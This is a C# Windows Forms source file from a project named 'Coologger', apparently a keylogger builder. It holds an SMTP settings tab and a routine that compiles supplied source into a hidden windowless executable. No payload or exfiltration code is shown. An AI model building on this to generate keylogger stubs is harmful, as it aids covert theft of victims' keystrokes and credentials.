using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.Win32;

namespace Coologger
{
    public partial class SMTPTab : Form
    {
        public SMTPTab()
        {
            InitializeComponent();
        }

        #region Singleton
        static SMTPTab _Instance = null;
        static readonly object PadLock = new object();

        public static SMTPTab Instance
        {
            get
            {
                lock (PadLock)
                {
                    return _Instance ?? (_Instance = new SMTPTab());
                }
            }
        }
        #endregion

        private void FButton4_Click(object sender, EventArgs e)
        {
            MailSettingsForm.Instance.ComboBox1.Items.Add(TextBox3.Text);
            this.Hide();
        }

        void Compile(string Code, string Path, bool FormProgram, string MainClass)
        {
            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");
            VBCodeProvider CodeProvider = new VBCodeProvider(providerOptions);
            CompilerParameters Parameters = new CompilerParameters();
            Parameters.GenerateExecutable = true;
            Parameters.OutputAssembly = Path;
            if (FormProgram) Parameters.CompilerOptions = "/target:winexe";
            Parameters.MainClass = MainClass;
            Parameters.IncludeDebugInformation = false;
            Parameters.ReferencedAssemblies.Add("System.dll");
            Parameters.ReferencedAssemblies.Add("System.Data.dll");
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            Parameters.ReferencedAssemblies.Add("System.XML.dll");

            CompilerResults Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code);
            if (Results.Errors.Count > 0)
            {
                foreach (CompilerError E in Results.Errors)
                {
                    MessageBox.Show(E.ErrorText);
                }
            }
        }

        #region MouseControls
        Point lastClick;
        private void MouseMoved_Control(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastClick.X;
                this.Top += e.Y - lastClick.Y;
            }
        }

        private void MouseDown_Control(object sender, MouseEventArgs e)
        {
            lastClick = new Point(e.X, e.Y);
        }
        #endregion
    }
}
